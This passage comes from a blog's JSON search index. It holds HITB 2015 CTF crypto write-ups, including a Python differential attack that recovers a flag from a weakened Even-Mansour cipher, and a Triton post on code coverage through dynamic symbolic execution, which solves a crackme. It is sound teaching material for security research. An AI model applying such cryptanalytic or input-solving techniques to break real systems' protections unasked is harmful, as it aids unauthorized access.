mail.msg -inkey private.pem hitb{0b21cc2025534dbd2965390d2bcef45d} The sources are available here\n","date":1446508800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"bfd9a832e015cbe54fb5349a493df00d","permalink":"https://www.romainthomas.fr/post/15-11-hitb2015-crypto300/","publishdate":"2015-11-03T00:00:00Z","relpermalink":"/post/15-11-hitb2015-crypto300/","section":"post","summary":"Write-up for the Crypto 300 challenge","tags":["write-up","cryptography"],"title":"HITB 2015 Write-up - Crypto 300","type":"post"},{"authors":["Romain Thomas"],"categories":["write-up","cryptography"],"content":"Introduction The crypto 400 challenge deals with the Even Mansour cryptosystem. To validate this challenge we have to send the flag to a server. The server checks if the answer matches the flag by encrypting the flag and the given message with a random key. If both are equal the flag is correct otherwise it fails and the encrypted message is printed.\nkey = os.urandom(32) enc_flag = encrypt(flag, key) enc = encrypt(answer, key) if enc == enc_flag: response = \u0026#34;You lucky bastard, %s is indeed the correct flag!\\n\u0026#34; % flag else: response = \u0026#34;Unfortunately that is not our flag :(\\n\u0026#34; response += \u0026#34;Your guess encrypts as\\n%s\u0026#34; % enc response += \u0026#34;whereas our flag encrypts as\\n%s\u0026#34; % enc_flag Even Mansour scheme In this Even-Masour scheme the size of a block is 16-bytes and the key \u0026mdash; on 32-bytes \u0026mdash; is split in two: $k_1$ and $k_2$ each one on 16-bytes. At first, the message $M$ is xor-ed with $k_1$ then $M \\oplus k_1$ is going through a $F$ function which will be discussed later. Finally the output is xor-ed with $k_2$.\nSo we have:\n$$C = F(M \\oplus k_1) \\oplus k_2$$\ndef EvenMansour(block, key): block = xor(block, key[:16]) block = F(block) block = xor(block, key[16:]) return block In this challenge, the weakness comes from the $F$ function.\n$F$ function The $F$ function is composed of 64-rounds that perform the step(...) transformation:\ndef F(block): for i in range(64): block = step(block) return block step uses a S-Box to transform the block in this way:\n$\\begin{cases} \\text{block}^{n+1}_0 = \\text{SBox}(\\text{block}^{n}_{10} \\oplus \\text{block}^{n}_{12} \\oplus \\text{block}^{n}_{13} \\oplus \\text{block}^{n+1}_{15}) \u0026amp; k = 0 \\\\\\ \\text{block}^{n+1}_k = \\text{block}^{n}_{k - 1} \u0026amp; k \u0026gt; 0 \\end{cases}$\n$\\text{block}^{n}_k$ is the byte $k$ of the block at round $n$ ($0 \\leq k \u0026lt; 16$ and $0 \\leq n \u0026lt; 64$)\ndef step(block): return chr( S[ ord(block[10]) ^ ord(block[12]) ^ ord(block[13]) ^ ord(block[15]) ] ) + block[:15] By ploting $y = \\text{S-Box}(x)$ we can notice that the S-Box has a special construction:\nI thought about computing the differential characteristics which is the probability that given the input difference $\\Delta = x \\oplus y$ we get the output delta: $\\delta = S(x) \\oplus S(y)$. We will call this probability $P(\\Delta | \\delta)$ and with following function, we can compute this probability:\ndef P(dx ,dy): count = 0; for x in range(len(SBox)): dY = SBox[x] ^ SBox[x ^ dx] if dY == dy: count += 1; return float(count) / float(256) For all $\\Delta$ and $\\delta$, we notice that this probability is either 0 or 1. Consequently if we know $\\delta$ we are sure to find $\\Delta$. This will be useful for the differential attack.\nDifferential Attack To find the flag, we will perform a differential attack. We have a message $M_1$ that we know and we have an unknown second message $M_2$ that is the flag. We also know $C_1$ and $C_2$ such as:\n$$\\begin{align} C_1 \u0026amp; = \u0026amp; F(M_1 \\oplus k_1) \\oplus k_2 \\\\\\ C_2 \u0026amp; = \u0026amp; F(M_2 \\oplus k_1) \\oplus k_2 \\end{align}$$\nBy xor-ing $C_1$ and $C_2$ we can get $\\Delta W = W_1 \\oplus W_2 = C_1 \\oplus C_2$. If somehow we can resolve $\\Delta V$:\n$$\\begin{align} \\Delta V \u0026amp; = \u0026amp; V_1 \\oplus V_2 \\\\\\ \u0026amp; = \u0026amp; M_1 \\oplus k_1 \\oplus M_2 \\oplus k_1\\\\\\ \u0026amp; = \u0026amp; M_1 \\oplus M_2. \\end{align}$$\nWe can extract $M_2$ with:\n$$M_2 = \\Delta V \\oplus M_1$$\nRecovering $\\Delta V$ Now, let\u0026rsquo;s see how to resolve $\\Delta V$ from $\\Delta W$.\nFrom the step function, we know that $\\text{block}^{n+1}_k = \\text{block}^{n}_{k - 1}$ therefore:\n$$\\Delta W^{n-1}_k = \\Delta W^{n}_{k + 1} \\forall k \u0026lt; 15$$\nWe know also $\\Delta W^{n-1}_{0,1,2 \\ldots 14}$ but not $\\Delta W^{n-1}_{15}$\nTo find $\\Delta W^{n-1}_{15}$ we will use the fact that $P(\\Delta X | \\Delta W^{n-1}_{15}) = 1$ for a given $\\Delta X$. Concretely, I built a table diffTable which maps $\\delta$ to $\\Delta$.\n\\begin{align} \\text{diffTable}(\\Delta W^{n}_{0}) \u0026amp; = \u0026amp; \\Delta W^{n-1}_{10} \\oplus \\Delta W^{n-1}_{12} \\oplus \\Delta W^{n-1}_{13} \\oplus \\Delta W^{n-1}_{15} \\\\\\ \u0026amp; = \u0026amp; \\Delta W^{n}_{11} \\oplus \\Delta W^{n}_{13} \\oplus \\Delta W^{n}_{14} \\oplus \\Delta W^{n-1}_{15}\\\\\\ \\Delta W^{n-1}_{15} \u0026amp; = \u0026amp; \\text{diffTable}(\\Delta W^{n}_{0}) \\oplus \\Delta W^{n}_{11} \\oplus \\Delta W^{n}_{13} \\oplus \\Delta W^{n}_{14} \\end{align}\nWhich enables to recover $\\Delta W^{n - 1}$ from $\\Delta W^{n}$. Then, with recursion we can compute $\\Delta W^{0} = \\Delta V$\nImplementation The following script is the implementation of the attack:\n#!/usr/bin/python2.7 # -*- coding: utf-8 -*- import os S = [ 0xa5,0xc6,0x62,0x01,0x49,0x2a,0x8e,0xed,0x1f,0x7c,0xd8,0xbb,0xf3,0x90,0x34,0x57, 0xb3,0xd0,0x74,0x17,0x5f,0x3c,0x98,0xfb,0x09,0x6a,0xce,0xad,0xe5,0x86,0x22,0x41, 0x89,0xea,0x4e,0x2d,0x65,0x06,0xa2,0xc1,0x33,0x50,0xf4,0x97,0xdf,0xbc,0x18,0x7b, 0x9f,0xfc,0x58,0x3b,0x73,0x10,0xb4,0xd7,0x25,0x46,0xe2,0x81,0xc9,0xaa,0x0e,0x6d, 0xfd,0x9e,0x3a,0x59,0x11,0x72,0xd6,0xb5,0x47,0x24,0x80,0xe3,0xab,0xc8,0x6c,0x0f, 0xeb,0x88,0x2c,0x4f,0x07,0x64,0xc0,0xa3,0x51,0x32,0x96,0xf5,0xbd,0xde,0x7a,0x19, 0xd1,0xb2,0x16,0x75,0x3d,0x5e,0xfa,0x99,0x6b,0x08,0xac,0xcf,0x87,0xe4,0x40,0x23, 0xc7,0xa4,0x00,0x63,0x2b,0x48,0xec,0x8f,0x7d,0x1e,0xba,0xd9,0x91,0xf2,0x56,0x35, 0x14,0x77,0xd3,0xb0,0xf8,0x9b,0x3f,0x5c,0xae,0xcd,0x69,0x0a,0x42,0x21,0x85,0xe6, 0x02,0x61,0xc5,0xa6,0xee,0x8d,0x29,0x4a,0xb8,0xdb,0x7f,0x1c,0x54,0x37,0x93,0xf0, 0x38,0x5b,0xff,0x9c,0xd4,0xb7,0x13,0x70,0x82,0xe1,0x45,0x26,0x6e,0x0d,0xa9,0xca, 0x2e,0x4d,0xe9,0x8a,0xc2,0xa1,0x05,0x66,0x94,0xf7,0x53,0x30,0x78,0x1b,0xbf,0xdc, 0x4c,0x2f,0x8b,0xe8,0xa0,0xc3,0x67,0x04,0xf6,0x95,0x31,0x52,0x1a,0x79,0xdd,0xbe, 0x5a,0x39,0x9d,0xfe,0xb6,0xd5,0x71,0x12,0xe0,0x83,0x27,0x44,0x0c,0x6f,0xcb,0xa8, 0x60,0x03,0xa7,0xc4,0x8c,0xef,0x4b,0x28,0xda,0xb9,0x1d,0x7e,0x36,0x55,0xf1,0x92, 0x76,0x15,0xb1,0xd2,0x9a,0xf9,0x5d,0x3e,0xcc,0xaf,0x0b,0x68,0x20,0x43,0xe7,0x84 ] def xor(block1, block2): return \u0026#34;\u0026#34;.join( chr(ord(a) ^ ord(b)) for (a,b) in zip(block1, block2)) def step(block): return chr(S[ord(block[10]) ^ ord(block[12]) ^ ord(block[13]) ^ ord(block[15])]) + block[:15] def F(block): for i in xrange(64): block = step(block) return block def EvenMansour(block, key): block = xor(block, key[:16]) block = F(block) block = xor(block, key[16:]) return block def encrypt(data, key): data, num_blocks = pad(data) res = \u0026#34;\u0026#34; for i in xrange(num_blocks): block = EvenMansour(data[16*i:16*i+16], key) res += block return res def pad(data): while True: data += \u0026#39;\\x00\u0026#39; if len(data) % 16 == 0: return data, len(data) / 16 # # Table T[a] = b such as # S[x] ^ S[y] = a and b = x ^ y # def DiffTable(S): table = [0 for i in range(len(S))] for delta in range(len(S)): for x in range(len(S)): dY = S[x] ^ S[x ^ delta] table[dY] = delta return table def main(): key = os.urandom(32) M1 = \u0026#34;hitb{0123456789abcdef}\u0026#34; M2 = \u0026#34;aaaaaaaaaaaaaaaaaaaaaa\u0026#34; C1 = encrypt(M1, key) C2 = encrypt(M2, key) numberOfBlocks = len(C2) / 16 diffTable = DiffTable(S) clearText = \u0026#34;\u0026#34; for block in range(numberOfBlocks): dW = xor(C1,C2)[16 * block : 16 * (block + 1)] for i in range(64): dWtemp = [dW[i + 1] for i in range(15)] delta = diffTable[ord(dW[0])] dW15 = chr(ord(dW[11]) ^ ord(dW[13]) ^ ord(dW[14]) ^ delta) dWtemp.append(dW15) dW = \u0026#34;\u0026#34;.join(dWtemp) M = xor(dW, M2[16 * block : 16 * (block + 1)]) clearText += M print clearText if __name__ == \u0026#39;__main__\u0026#39;: main() Conclusion In fact by noticing that\n$$F(x \\oplus y) = F(x) \\oplus F(y) \\oplus C^{te}$$\nfor b in xrange(10): u = os.urandom(16); v = os.urandom(16); d = xor(F(xor(u,v)), xor(F(u), F(v))) print d.encode(\u0026#34;hex\u0026#34;) We have:\n\\begin{align} F(M_1 \\oplus k_1) \\oplus F(M_2 \\oplus k_1) \u0026amp; = \u0026amp; F(M_1) \\oplus F(M_2)\\ M_2 \u0026amp; = \u0026amp; F^{-1}(F(M_1) \\oplus C_1 \\oplus C_2) \\end{align}\nWhich is far more easier to resolve.\nThanks to jb^ who help me and who find the previous technique.\nSources are available here\n","date":1446508800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"6632e421a5370b9bd27f6a6e74ebe4c8","permalink":"https://www.romainthomas.fr/post/15-11-hitb2015-crypto400/","publishdate":"2015-11-03T00:00:00Z","relpermalink":"/post/15-11-hitb2015-crypto400/","section":"post","summary":"Write up","tags":["write-up","cryptography"],"title":"HITB 2015 Write-up - Crypto 400","type":"post"},{"authors":["Jonathan Salwan","Romain Thomas"],"categories":null,"content":"Introduction Code coverage is mainly used in the vulnerability research area. The goal is to generate inputs which will reach different parts of the program\u0026rsquo;s code. Then, if an input makes the program crash, we check if the crash can be exploited or not. A lot of methods exist to perform code coverage - like random testing or mutation generation - but in this short blog post, we will focus on code coverage using a dynamic symbolic execution (DSE) and explain why it\u0026rsquo;s not a trivial task. Please, note that covering up the code doesn\u0026rsquo;t mean finding every possible bugs. Some bugs do not make the program crash and this talk from slides 35 to 38 explains why. However, if we perform model checking associated with code coverage, it starts to get interesting =).\nCode coverage and DSE Note that unlike a SSE (static symbolic execution), a DSE is applied on a trace and can discover new branches only if these ones are reached during the execution. To go through another path, we must solve one of the last branch constraints discovered from the last trace. Then, we repeat this operation until all branches are taken.\nFor example, let\u0026rsquo;s assume a program $P$ which takes an input called $I$, where I may be a model $M$ or a random seed $R$. An execution is denoted $P(I)$ and returns a set of constraints $PC$. All $\\varphi_{i}$ represent basic blocks and $\\pi_i$ represent the branches constraint. A model $M_i$ is (at least) one valid solution of a constraint $\\pi_i$. For example, $M_1 = Solution(\\neg\\pi_1 \\land \\pi_2)$. To discover all paths, we maintain a worklist denoted $W$ which is a set of $M$.\nAt the first iteration, $I = R, W = \\emptyset$ and $P(I) \\rightarrow PC$. Then, $\\forall \\pi \\in PC, W = W \\cup { Solution(\\pi) }$ and we execute once again the program such that $\\forall M \\in W, P(M)$. When a model $M$ is injected in the program\u0026rsquo;s input, it is deleted from the worklist $W$. Then, we repeat this operation until $W$ is empty.\nSymbolic code coverage implies some pros and cons. For us, it is really useful when we work on a obfuscated binary. Indeed, applying symbolic coverage can detect opaque predicates or unreachable code but also repair a flattened graph (we will release soon another blog post about Triton and o-llvm). The worst con about the symbolic execution is when your expressions are too complexes which implies a timeout from the SMT solver or an impressive memory consumption (in the past, our bigger symbolic expression has consumed ~450 Go of RAM before timeout). This scenario mainly occurs when we analyse real large binaries or obfuscated binaries which contain polynomial functions. Some of these cons may partially be fixed by optimizing symbolic expressions but this subject will be another story to come later :).\nPerforming code coverage using Triton Since the version v0.1 build 633 (commit 474fe2), Triton integrates everything we need to perform code coverage. These new features allow us to deal and compute the SMT2-Lib representation over an AST. In the rest of the blog post, we will focus on the design and the algorithm used to perform code coverage.\nAlgorithm As an introduction (and to not turn our brain upside down), let assume this following sample of code which comes from the samples directory.\nchar *serial = \u0026#34;\\x31\\x3e\\x3d\\x26\\x31\u0026#34;; int check(char *ptr) { int i = 0; while (i \u0026lt; 5){ if (((ptr[i] - 1) ^ 0x55) != serial[i]) return 1; i++; } return 0; } Basically, this function checks if the input is equal to elite, and returns 0 if it is true, otherwise it returns 1. The control flow graph of this function is described below. It\u0026rsquo;s an interesting first example, because to cover all basic blocks we need to find the good input.\nWe can see that only one variable can be controlled, the one located at the address rbp+var_18 which refers to the argv[1] \u0026rsquo;s pointer. The goal is to reach all the basic blocks in the function check by computing the constraints and using the snapshot engine until that every basic blocks are reached. For instance, the constraint to reach the basic block located at the address 0x4005C3 is [rbp+var_4] \u0026gt; 4 but we do not control this variable directly. In the other hand, the jump at the address 0x4005B0 depends on the user input and this constraint can be solved by performing a symbolic execution.\nThe algorithm which generalizes the previous idea is based on the Microsoft\u0026rsquo;s fuzzer algorithm (SAGE) and the next diagram represents our check function with its constraints. The start and end nodes represent respectively the function\u0026rsquo;s prologue (0x40056D) and the function\u0026rsquo;s epilogue (0x4005C8).\nBefore the first execution, we know nothing about branches\u0026rsquo; constraints. So, as explained in the previous chapter, we inject some random seeds to collect the first $PC$ and build our set $W$. The trace of the first execution $P(I)$ is represented by the basic blocks in blue.\nThis execution gives us our first path constraint $P(I) \\rightarrow (\\pi_0 \\land \\neg \\pi_1)$.\nBased on our first trace, we know that there are two branches ($\\pi_0 \\land \\neg \\pi_1$) discovered and so 2 others undiscovered. To reach the basic bloc $\\varphi_3$, we compute the negation of the first branch constraint. If and only if the solution $Solution(\\neg \\pi_0)$ is SAT, we add the model to the worklist W.\nSame for $\\varphi_4$ such that $W = W \\cup {Solution(\\pi_0 \\land \\neg(\\neg \\pi_1))}$. Once all solutions have been generated and models added to the worklist, we execute every models from the worklist.\nImplementation One condition to perform code coverage, is to predict the next instruction address when we are on a jump instruction. This condition is necessary to build the path constraint.\nWe can not put a callback after a branch instruction because the RIP register has already changed. As Triton creates semantics expressions for all registers, the idea is to evaluate RIP when we are on a branch instruction.\nIn a first time, we have developed a SMT evaluator to compute the RIP but we saw a little bit later that Pin provides IARG_BRANCH_TARGET_ADDR and IARG_BRANCH_TAKEN which can be used to know the next RIP values. With Pin, computing the next address is very easy, nevertheless the SMT evaluator was useful to check instruction\u0026rsquo;s semantics.\nTo perform the evaluation, we implemented the visitor pattern to transform the SMT abstract syntax tree (AST) to a Z3 AST. This design can be used to transform our SMT AST into any others representations.\nThe Z3 AST is easier to handle and can be evaluated or simplified with Z3 API. The transformation is performed by src/smt2lib/z3AST.h and src/smt2lib/z3AST.cpp.\nWe will now explain how the code coverage\u0026rsquo;s tool works. Let\u0026rsquo;s assume that inputs come from command\u0026rsquo;s line. Firstly, we have:\n199 200 201 202 203 def run(inputSeed, entryPoint, exitPoint, whitelist = []): ... if __name__==\u0026#39;__main__\u0026#39;: TritonExecution.run(\u0026#34;bad !\u0026#34;, 0x400480, 0x40061B, [\u0026#34;main\u0026#34;, \u0026#34;check\u0026#34;]) # crackme_xor At line 176, we define the input seed bad ! which is the first program\u0026rsquo;s argument (argv[1]). Then, we give the address from the beginning of the code coverage (start block) - it\u0026rsquo;s at this address that we will take a snapshot. The third argument matches with the end block - it\u0026rsquo;s at this address that we will restore the snapshot. Finally, we can set a whitelist to avoid specific functions like library\u0026rsquo;s functions, cryptographic\u0026rsquo;s function and so on.\n134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 def mainAnalysis(threadId): print \u0026#34;[+] In main\u0026#34; rdi = getRegValue(IDREF.REG.RDI) # argc rsi = getRegValue(IDREF.REG.RSI) # argv argv0_addr = getMemValue(rsi, IDREF.CPUSIZE.QWORD) # argv[0] pointer argv1_addr = getMemValue(rsi + 8, IDREF.CPUSIZE.QWORD) # argv[1] pointer print \u0026#34;[+] In main() we set :\u0026#34; od = OrderedDict(sorted(TritonExecution.input.dataAddr.items())) for k,v in od.iteritems(): print \u0026#34;\\t[0x%x] = %x %c\u0026#34; % (k, v, v) setMemValue(k, IDREF.CPUSIZE.BYTE, v) convertMemToSymVar(k, IDREF.CPUSIZE.BYTE, \u0026#34;addr_%d\u0026#34; % k) for idx, byte in enumerate(TritonExecution.input.data): if argv1_addr + idx not in TritonExecution.input.dataAddr: # Not overwrite the previous setting print \u0026#34;\\t[0x%x] = %x %c\u0026#34; % (argv1_addr + idx, ord(byte), ord(byte)) setMemValue(argv1_addr + idx, IDREF.CPUSIZE.BYTE, ord(byte)) convertMemToSymVar(argv1_addr + idx, IDREF.CPUSIZE.BYTE, \u0026#34;addr_%d\u0026#34; % idx) The next code being executed is the mainAnalysis callback, we inject values to the inputs selected (line 148, 154) and we convert these inputs as symbolic variables (line 149, 155).\nAll inputs selected are stored in a global variable called TritonExecution.input. Then, we can begin the code exploration.\n58 59 60 61 if instruction.getAddress() == TritonExecution.entryPoint and not isSnapshotEnabled(): print \u0026#34;[+] Take Snapshot\u0026#34; takeSnapshot() return When we are at the entry point, we take a snapshot in order to replay code exploration with a new input.\n63 64 65 66 67 68 69 70 71 72 73 74 if instruction.isBranch() and instruction.getRoutineName() in TritonExecution.whitelist: addr1 = instruction.getAddress() + 2 # Address next to this one addr2 = instruction.getOperands()[0].getValue() # Address in the instruction condition # [PC id, address taken, address not taken] if instruction.isBranchTaken(): TritonExecution.myPC.append([ripId, addr2, addr1]) else: TritonExecution.myPC.append([ripId, addr1, addr2]) return This test above checks if we are on a branch instruction like (jnz, jle \u0026hellip;) and if we are in a function which is into the white list. If so, we get the two possible addresses (addr1 and addr2) and the effective address is computed by isBranchTaken() (line 69).\nThen, we store into the path constraint the RIP expression, the address taken and the address not taken (line 73-76).\n81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 if instruction.getAddress() == TritonExecution.exitPoint: print \u0026#34;[+] Exit point\u0026#34; # SAGE algorithm # http://research.microsoft.com/en-us/um/people/pg/public_psfiles/ndss2008.pdf for j in range(TritonExecution.input.bound, len(TritonExecution.myPC)): expr = [] for i in range(0,j): ripId = TritonExecution.myPC[i][0] symExp = getFullExpression(getSymExpr(ripId).getAst()) addr = TritonExecution.myPC[i][1] expr.append(smt2lib.smtAssert(smt2lib.equal(symExp, smt2lib.bv(addr, 64)))) ripId = TritonExecution.myPC[j][0] symExp = getFullExpression(getSymExpr(ripId).getAst()) addr = TritonExecution.myPC[j][2] expr.append(smt2lib.smtAssert(smt2lib.equal(symExp, smt2lib.bv(addr, 64)))) expr = smt2lib.compound(expr) model = getModel(expr) if len(model) \u0026gt; 0: newInput = TritonExecution.input newInput.setBound(j + 1) for k,v in model.items(): symVar = getSymVar(k) newInput.addDataAddress(symVar.getKindValue(), v) print newInput.dataAddr isPresent = False for inp in TritonExecution.worklist: if inp.dataAddr == newInput.dataAddr: isPresent = True break if not isPresent: TritonExecution.worklist.append(newInput) # If there is input to test in the worklist, we restore the snapshot if len(TritonExecution.worklist) \u0026gt; 0 and isSnapshotEnabled(): print \u0026#34;[+] Restore snapshot\u0026#34; restoreSnapshot() return The last step happens when we are on the exit point. Lines 84 to 120 are the SAGE implementation. In few words, we browse the path constraints\u0026rsquo; list and for each PC, we try to get the model which satisfies the negation. If there is a valid model to reach the new target basic block, we add the model into the worklist.\nOnce all models are inserted into the worklist, we restore the snapshot and we re-inject each model as input seed.\nThe full code can be found here and its execution on our example looks like this:\n$ ./triton ./tools/code_coverage.py ./samples/crackmes/crackme_xor abc [+] Take Snapshot [+] In main [+] In main() we set : [0x7ffd5ef8254d] = 62 b [0x7ffd5ef8254e] = 61 a [0x7ffd5ef8254f] = 64 d [0x7ffd5ef82550] = 20 [0x7ffd5ef82551] = 21 ! loose [+] Exit point {140726196774221: 101} [+] Restore snapshot [+] In main [+] In main() we set : [0x7ffd5ef8254d] = 65 e [0x7ffd5ef8254e] = 61 a [0x7ffd5ef8254f] = 64 d [0x7ffd5ef82550] = 20 [0x7ffd5ef82551] = 21 ! loose [+] Exit point {140726196774221: 101, 140726196774222: 108} [+] Restore snapshot [+] In main [+] In main() we set : [0x7ffd5ef8254d] = 65 e [0x7ffd5ef8254e] = 6c l [0x7ffd5ef8254f] = 64 d [0x7ffd5ef82550] = 20 [0x7ffd5ef82551] = 21 ! loose [+] Exit point {140726196774221: 101, 140726196774222: 108, 140726196774223: 105} [+] Restore snapshot [+] In main [+] In main() we set : [0x7ffd5ef8254d] = 65 e [0x7ffd5ef8254e] = 6c l [0x7ffd5ef8254f] = 69 i [0x7ffd5ef82550] = 20 [0x7ffd5ef82551] = 21 ! loose [+] Exit point {140726196774224: 116, 140726196774221: 101, 140726196774222: 108, 140726196774223: 105} [+] Restore snapshot [+] In main [+] In main() we set : [0x7ffd5ef8254d] = 65 e [0x7ffd5ef8254e] = 6c l [0x7ffd5ef8254f] = 69 i [0x7ffd5ef82550] = 74 t [0x7ffd5ef82551] = 21 ! loose [+] Exit point {140726196774224: 116, 140726196774225: 101, 140726196774221: 101, 140726196774222: 108, 140726196774223: 105} [+] Restore snapshot [+] In main [+] In main() we set : [0x7ffd5ef8254d] = 65 e [0x7ffd5ef8254e] = 6c l [0x7ffd5ef8254f] = 69 i [0x7ffd5ef82550] = 74 t [0x7ffd5ef82551] = 65 e Win [+] Exit point [+] Done ! Further improvement Currently, the evaluator is quite slow and we loose a lot of time to evaluate expressions. One feature that should improve the evaluator speed is a SMT simplifier. We plan to develop a passes system (like LLVM) to simplify the SMT tree.\nThe goal is to register some expressions transformation rules before sending expressions to the evaluator or the solver. For example, that\u0026rsquo;s what miasm2 already does.\nThere are a lot of mini tricks to lighten symbolic expressions which are easy to implement and really beneficial. For example, the transformation of the expression rax1 = (bvxor rax0 rax0) -\u0026gt; rax1 = (_ bv64 0) will break the rax\u0026rsquo;s symbolic expression chain.\nConclusion Although the code coverage using a symbolic resolution is a nice way to cover a code without guessing the inputs, it\u0026rsquo;s clearly not a trivial task. The paths explosion implies the memory consumption and in several cases the expressions are too complex to be computed but this method remains truly effective on short parts of code.\nNote To improve the symbolic coverage, it could be interesting to deal with bits-flip/random seeds when expressions are too complex or to deal with symbolic execution and abstract domains. ","date":1444608e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"656395ca2a0463a0cac1f5ee6f7e2c61","permalink":"https://www.romainthomas.fr/post/15-10-triton-code-coverage/","publishdate":"2015-10-12T00:00:00Z","relpermalink":"/post/15-10-triton-code-coverage/","section":"post","summary":"This blog post introduces code coverage with Triton","tags":[""],"title":"Code coverage using a dynamic symbolic execution","type":"post"},{"authors":["Jonathan Salwan","Romain Thomas"],"categories":null,"content":" ","date":1441065600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1650903950,"objectID":"e47dace0552b838319d6e65e53b32139","permalink":"https://www.romainthomas.fr/publication/triton/","publishdate":"2015-09-01T00:00:00Z","relpermalink":"/publication/triton/","section":"publication","summary":"Binary obfuscation is used to protect software's intellectual property. There exist different kinds of obfucation but roughly, it transforms a binary structure into another binary structure by preserving the same semantic. The aim of obfuscation is to ensure that the original information is 'drown' in useless information that will make reverse engineering harder. In this article we will show how we can analyse an ofbuscated program and break some obfuscations using the Triton framework","tags":null,"title":"How Triton may help to analyse obfuscated binaries","type":"publication"}]